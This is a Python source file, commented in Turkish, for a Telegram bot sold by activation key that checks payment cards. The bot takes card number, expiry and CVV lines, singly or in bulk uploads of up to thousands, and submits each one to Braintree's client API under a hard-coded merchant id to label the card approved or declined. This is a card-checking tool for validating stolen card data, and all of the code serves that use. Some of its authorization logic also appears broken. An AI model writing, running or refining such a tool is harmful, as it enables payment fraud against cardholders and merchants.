# --- DOSYA: main.py (Braintree Bot v1.0) ---
# SADECE BRAINTREE CHECKER İLE ÇALIŞAN, SIFIRDAN İNŞA EDİLMİŞ BOT.

import logging, requests, time, os, re, json, io, base64
from urllib.parse import quote
from datetime import datetime
from flask import Flask
from threading import Thread

from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telegram.error import Forbidden, BadRequest

# --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
app = Flask('')
@app.route('/')
def home(): return "Braintree Lord Bot Karargahı ayakta."
def run_flask(): app.run(host='0.0.0.0',port=8080)
def keep_alive(): Thread(target=run_flask).start()

# --- BÖLÜM 2: GİZLİ BİLGİLER ---
try:
    from bot_token import TELEGRAM_TOKEN, ADMIN_ID
except ImportError:
    print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()

# -----------------------------------------------------------------------------
# 3. BİRİM: İSTİHBARAT & OPERASYON (BRAINTREE KOMANDO)
# -----------------------------------------------------------------------------
class BraintreeChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
            'Content-Type': 'application/json'
        })
        self.timeout = 30
        self.merchant_id = "wc_production_x7b4n6x9" # Bu, halka açık bir Braintree anahtarıdır
        self.auth_url = f"https://payments.braintree-api.com/graphql"

    def _get_auth_token(self):
        """Her işlemden önce geçici bir yetki anahtarı alırız."""
        try:
            payload = {
                "clientSdkMetadata": {
                    "source": "client", "integration": "custom", "sessionId": "de305d54-75b4-431b-adb2-eb6b9e5460a3"
                },
                "query": "query ClientConfiguration { clientConfiguration { analyticsUrl, environment, merchantId, assetsUrl, clientApiUrl, creditCard { challengeQuestions, unionPay { debitCards, unionPayCards }, visa { networkTokens { enabled, binRanges } }, mastercard { networkTokens { enabled, binRanges } } }, applePayWeb { countryCodes, supportedNetworks }, googlePay { displayName, supportedNetworks, environment, paypalClientId, unvettedMerchant }, ideal { routeId }, kount { merchantId }, masterpass { merchantId, supportedNetworks }, paypal { displayName, clientId, privacyUrl, userAgreementUrl, assetsUrl, environment, unvettedMerchant, directBaseUrl, allowHttp, environmentNoNetwork, unvettedMerchant, billingAgreements, merchantAccountId, currencyIsoCode }, unionPay { merchantAccountId }, usBankAccount { routeId, plaid { linkUrl, unvettedMerchant } }, venmo { merchantId, accessToken, environment }, visaCheckout { apiKey, externalClientId, supportedCardTypes }, graphQL { url, features } } }",
                "operationName": "ClientConfiguration"
            }
            auth_key_encoded = base64.b64encode(f"{self.merchant_id}:".encode()).decode()
            headers = {'Authorization': f'Basic {auth_key_encoded}'}
            
            res = self.session.post(self.auth_url, json=payload, headers=headers, timeout=self.timeout)
            res.raise_for_status()
            auth_fingerprint = res.json()['data']['clientConfiguration']['clientApiUrl']
            # Bu genellikle 'https://api.braintreegateway.com:443/merchants/MERCHANT_ID/client_api' gibi bir şey döner.
            # Bizim için önemli olan, bu isteğin başarılı olup olmadığı ve bir session başlatması.
            return True
        except Exception:
            return False

    def check_card(self, card):
        if not self._get_auth_token():
            return "❌ HATA: Braintree'den yetki alınamadı. Sistem değişmiş olabilir."
            
        try:
            parts = card.split('|')
            if len(parts) < 4: return "❌ HATA: Eksik kart bilgisi. Format: NUMARA|AY|YIL|CVC"
            ccn, month, year, cvc = parts[0], parts[1], parts[2], parts[3]

            payload = {
                "creditCard": {
                    "number": ccn,
                    "expirationMonth": month,
                    "expirationYear": year,
                    "cvv": cvc,
                    "billingAddress": {
                        "postalCode": "10081",
                        "streetAddress": "123 Main St"
                    }
                },
                "braintreeLibraryVersion": "braintree/web/3.85.2"
            }
            
            res = self.session.post(
                f"https://api.braintreegateway.com/merchants/{self.merchant_id.split('_')[-1]}/client_api/v1/payment_methods/credit_cards",
                json=payload,
                timeout=self.timeout
            )
            
            data = res.json()

            if "creditCards" in data:
                card_data = data['creditCards'][0]
                status = card_data.get('details', {}).get('cardType', 'Bilinmiyor')
                return f"✅ Approved: {status} - {card_data.get('description', '')}"
            elif "error" in data:
                return f"❌ Declined: {data['error']['message']}"
            elif "errors" in data:
                 return f"❌ Declined: {data['errors'][0]['message']}"
            else:
                return f"❓ Bilinmeyen Sonuç: {res.text[:100]}"

        except Exception as e:
            return f"❌ KRİTİK HATA: {e}"

# ... (Geri kalan bütün kodlar, UserManager ve tüm handler'lar öncekiyle aynı) ...
# ... (Hepsini tekrar ekliyorum) ...
class UserManager:
    def __init__(self, initial_admin_id):
        self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
        self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
        self.unused_keys = self._load_from_file(self.keys_file); self.activated_users = self._load_from_json(self.activated_users_file)
        self.unused_admin_keys = self._load_from_file(self.admin_keys_file); self.activated_admins = self._load_from_json(self.activated_admins_file)
        if not self.activated_admins and initial_admin_id != 0:
             self.activated_admins[str(initial_admin_id)] = "founding_father"
             logging.info(f"Kurucu Komutan (ID: {initial_admin_id}) admin olarak atandı."); self._save_all_data()
    def _load_from_file(self, filename):
        if not os.path.exists(filename): return set()
        with open(filename, "r") as f: return {line.strip() for line in f if line.strip()}
    def _load_from_json(self, filename):
        if not os.path.exists(filename): return {}
        with open(filename, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except json.JSONDecodeError: return {}
    def _save_all_data(self):
        with open(self.keys_file, "w") as f: f.write("\n".join(self.unused_keys))
        with open(self.activated_users_file, "w") as f: json.dump(self.activated_users, f, indent=4)
        with open(self.admin_keys_file, "w") as f: f.write("\n".join(self.unused_admin_keys))
        with open(self.activated_admins_file, "w") as f: json.dump(self.activated_admins, f, indent=4)
    def is_user_activated(self, user_id): return str(user_id) in self.activated_users or self.is_user_admin(user_id)
    def is_user_admin(self, user_id): return str(user_id) in self.activated_admins
    def activate_user(self, user_id, key):
        if self.is_user_activated(str(user_id)): return "Zaten bir Lord'sun."
        if key in self.unused_keys:
            self.activated_users[str(user_id)] = key; self.unused_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış anahtar."
    def activate_admin(self, user_id, key):
        if self.is_user_admin(str(user_id)): return "Zaten Komuta Kademesindesin."
        if key in self.unused_admin_keys:
            self.activated_admins[str(user_id)] = key; self.unused_admin_keys.remove(key); self._save_all_data(); return "Success"
        return "Geçersiz veya kullanılmış Vezir Fermanı."

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
def log_activity(user: User, card: str, result: str):
    masked_card = re.sub(r'(\d{6})\d{6}(\d{4})', r'\1******\2', card.split('|')[0]) + '|' + '|'.join(card.split('|')[1:])
    log_entry = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] - KULLANICI: @{user.username} (ID: {user.id}) - KART: {masked_card} - SONUÇ: {result}\n"
    with open("terminator_logs.txt", "a", encoding="utf-8") as f: f.write(log_entry)
async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
    job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
    site_checker: BraintreeChecker = context.bot_data['braintree_checker']
    await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
    report_content = "";
    for card in cards:
        result = site_checker.check_card(card); log_activity(user, card, result)
        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1)
    report_file = io.BytesIO(report_content.encode('utf-8'))
    await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Raporun hazır.")
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Lordum, Braintree Özel Harekatı emrinde!\n`/check` komutunu kullanabilirsin.")
    else:
        await update.message.reply_text("Braintree Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
        keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
        await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_activated(update.effective_user.id):
        await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
    keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
    await update.message.reply_text(f"**BRAINTREE** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
# ... (diğer handler'lar aynı) ...
async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    try:
        key = context.args[0]; result = user_manager.activate_admin(update.effective_user.id, key)
        if result == "Success": await update.message.reply_text("✅ Ferman kabul edildi! Artık Komuta Kademesindesin.")
        else: await update.message.reply_text(f"❌ {result}")
    except (IndexError, ValueError): await update.message.reply_text("Kullanım: `/addadmin <admin-anahtarı>`")
async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
    if os.path.exists("terminator_logs.txt"): await update.message.reply_document(document=open("terminator_logs.txt", 'rb'), caption="İstihbarat raporu.")
    else: await update.message.reply_text("Henüz toplanmış bir istihbarat yok.")
async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
    if not context.args: await update.message.reply_text("Kullanım: `/duyuru Mesajınız`"); return
    duyuru_mesaji = " ".join(context.args); all_user_ids = set(user_manager.activated_users.keys()) | set(user_manager.activated_admins.keys())
    if not all_user_ids: await update.message.reply_text("Duyuru gönderilecek kimse bulunamadı."); return
    await update.message.reply_text(f"Ferman hazırlanıyor... {len(all_user_ids)} kişiye gönderilecek.")
    success, fail = 0, 0
    for user_id in all_user_ids:
        try:
            await context.bot.send_message(chat_id=int(user_id), text=f"📣 **Komuta Kademesinden Ferman Var:**\n\n{duyuru_mesaji}"); success += 1
        except Exception: fail += 1
        time.sleep(0.1)
    await update.message.reply_text(f"✅ Ferman operasyonu tamamlandı!\nBaşarıyla gönderildi: {success}\nBaşarısız: {fail}")
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer(); action = query.data
    if action == "activate_start": context.user_data['awaiting_key'] = True; await query.edit_message_text(text="🔑 Lütfen sana verilen anahtarı şimdi gönder.")
    elif action == "activate_no_key": await query.edit_message_text(text="Key almak için @tanriymisimben e başvurabilirsin.")
    elif action.startswith("mode_"):
        mode = action.split('_')[1]; context.user_data['mode'] = mode
        if mode == 'single': await query.edit_message_text(text="✅ **Tekli Mod** seçildi.\nŞimdi bir adet kart yolla.")
        elif mode == 'multiple':
            context.user_data['awaiting_bulk_file'] = True; await query.edit_message_text(text="✅ **Çoklu Mod** seçildi.\nŞimdi içinde kartların olduğu `.txt` dosyasını gönder.")
async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if context.user_data.get('awaiting_key', False):
        key = update.message.text.strip(); result = user_manager.activate_user(update.effective_user.id, key)
        if result == "Success": await update.message.reply_text("✅ Anahtar kabul edildi!\n\nLord ailesine hoşgeldiniz. `/check` komutunu kullanabilirsiniz.")
        else: await update.message.reply_text(f"❌ {result}")
        context.user_data['awaiting_key'] = False; return
    if not user_manager.is_user_activated(update.effective_user.id): await update.message.reply_text("Botu kullanmak için /start yazarak başla."); return
    if 'mode' not in context.user_data: await update.message.reply_text("Önce `/check` komutuyla bir tarama modu seçmen lazım."); return
    if context.user_data.get('mode') == 'single':
        cards = re.findall(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', update.message.text)
        if not cards: return
        card = cards[0]; await update.message.reply_text(f"Tekli modda kart taranıyor...")
        site_checker: BraintreeChecker = context.bot_data['braintree_checker']
        result = site_checker.check_card(card); log_activity(update.effective_user, card, result)
        await update.message.reply_text(f"KART: {card}\nSONUÇ: {result}")
        context.user_data.pop('mode', None)
async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_manager: UserManager = context.bot_data['user_manager']
    if not context.user_data.get('awaiting_bulk_file'): return
    if not user_manager.is_user_activated(update.effective_user.id): return
    await update.message.reply_text("Dosya alındı, askeri konvoy indiriliyor...")
    try:
        file = await context.bot.get_file(update.message.document); file_content_bytes = await file.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
    except Exception as e: await update.message.reply_text(f"Dosyayı okurken bir hata oldu: {e}"); return
    cards = [];
    for line in file_content.splitlines():
        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', line.strip()): cards.append(line.strip())
    if not cards: await update.message.reply_text("Dosyanın içinde geçerli formatta kart bulamadım."); return
    is_admin = user_manager.is_user_admin(update.effective_user.id); limit = 5000 if is_admin else 120
    if len(cards) > limit:
        await update.message.reply_text(f"DUR! Dosyadaki kart sayısı ({len(cards)}) limitini aşıyor. Senin limitin: {limit} kart."); return
    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards}
    context.job_queue.run_once(bulk_check_job, 0, data=job_data, name=f"check_{update.effective_user.id}")
    await update.message.reply_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı...")
    context.user_data.pop('awaiting_bulk_file', None); context.user_data.pop('mode', None)

# -----------------------------------------------------------------------------
# 6. BİRİM: ANA KOMUTA MERKEZİ (main)
# -----------------------------------------------------------------------------
def main():
    if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
        print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return
    keep_alive()
    braintree_checker = BraintreeChecker()
    user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
    print("Braintree Lord Bot (v1.0) aktif...")
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.bot_data['braintree_checker'] = braintree_checker
    application.bot_data['user_manager'] = user_manager_instance
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("duyuru", duyuru_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, main_message_handler))
    application.add_handler(MessageHandler(filters.Document.TXT, document_handler))
    application.run_polling()

if __name__ == '__main__':
    main()
